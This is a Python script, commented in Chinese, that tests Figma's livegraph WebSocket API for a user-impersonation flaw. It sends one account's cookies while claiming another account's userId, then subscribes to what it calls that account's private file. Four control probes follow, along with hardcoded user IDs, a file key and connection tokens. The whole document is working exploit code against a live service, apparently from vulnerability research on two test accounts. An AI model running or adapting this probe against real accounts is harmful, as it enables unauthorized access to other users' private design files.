# -*- coding: utf-8 -*-
"""终极对照: 绝对纯净 B (authn+embed 都只留 B token) + claim A
若仍成功 → userId 伪造漏洞坐实 (任意登录用户可伪装任意用户)
若失败 → 之前成功是 embed token 残留的多账号行为 (非漏洞)
同时验证 claim B 基线 + authn.mac 校验是否存在
"""
import sys, json, asyncio, io, urllib.parse
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
TARGET = "5Gs4PaTz11Hlk2sqVnidBG"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def clean_json_cookie_field(raw_value, keep_uid):
    """URL编码的 JSON 字段 (authn/embed): 只保留 keep_uid 的 token"""
    v = urllib.parse.unquote(raw_value)
    try:
        d = json.loads(v)
    except Exception:
        return None  # 非 JSON, 原样保留
    if not isinstance(d, dict):
        return None
    nd = {k: val for k, val in d.items() if k == keep_uid}
    if not nd:
        return None  # 过滤后为空 → 删除该字段
    return urllib.parse.quote(json.dumps(nd, separators=(',', ':')))

def make_abs_pure(cookie, keep_uid):
    parts = {}
    for p in cookie.split('; '):
        if '=' in p:
            k, v = p.split('=', 1)
            parts[k] = v
    # authn: 只留 keep_uid
    authn_raw = parts.get('__Host-figma.authn', '')
    d = json.loads(urllib.parse.unquote(authn_raw))
    d = {k: v for k, v in d.items() if k == keep_uid}
    parts['__Host-figma.authn'] = urllib.parse.quote(json.dumps(d, separators=(',', ':')))
    # embed: 只留 keep_uid, 空则删除
    if '__Host-figma.embed' in parts:
        ne = clean_json_cookie_field(parts['__Host-figma.embed'], keep_uid)
        if ne:
            parts['__Host-figma.embed'] = ne
        else:
            del parts['__Host-figma.embed']
            parts.pop('__Host-figma.embed.mac', None)
    return '; '.join(f'{k}={v}' for k, v in parts.items())

rawB = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')
rawA = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')
ABS_B = make_abs_pure(rawB, B_UID)
ABS_A = make_abs_pure(rawA, A_UID)

def lg_url(fk, claim_uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={claim_uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{fk}"
            f"&connectionType=initial&reconnect=0")

async def probe(label, cookie, claim_uid, wait=15):
    frames = []
    try:
        async with websockets.connect(lg_url(TARGET, claim_uid),
                                      additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps({"messageType": "auth", "clientType": "web",
                                      "args": {"userId": claim_uid, "anonymousUserId": None},
                                      "tags": {"clientType": "web",
                                               "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                                               "clientUrl": f"https://www.figma.com/file/{TARGET}"},
                                      "clientRequestedVersion": 2}))
            auth_resp = None
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "auth" in msg:
                    auth_resp = json.loads(msg)
                    break
            au = auth_resp.get('userId') if auth_resp else None
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": "FileByKey",
                                      "viewHash": "f" * 32, "loadType": "initial",
                                      "args": {"fileKey": TARGET}}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}"); return
    print(f"[{label}] authUserId={au} 帧数={len(frames)}")
    for f in frames:
        if 'initial' in f or 'viewLoaded' in f or 'error' in f.lower():
            print(f"    🖼 {f[:900]}")

async def main():
    print("=" * 60)
    print("1. 绝对纯净B + claimA → FileByKey A私有文件 (终极!)")
    await probe("绝对纯净B claimA", ABS_B, A_UID)
    print("=" * 60)
    print("2. 绝对纯净B + claimB → FileByKey (基线, 验证cookie有效)")
    await probe("绝对纯净B claimB", ABS_B, B_UID)
    print("=" * 60)
    print("3. 绝对纯净A + claimB → FileByKey (反向对照)")
    await probe("绝对纯净A claimB", ABS_A, B_UID)
    print("=" * 60)
    print("4. 绝对纯净A + claimA → FileByKey (owner对照)")
    await probe("绝对纯净A claimA", ABS_A, A_UID)

asyncio.run(main())
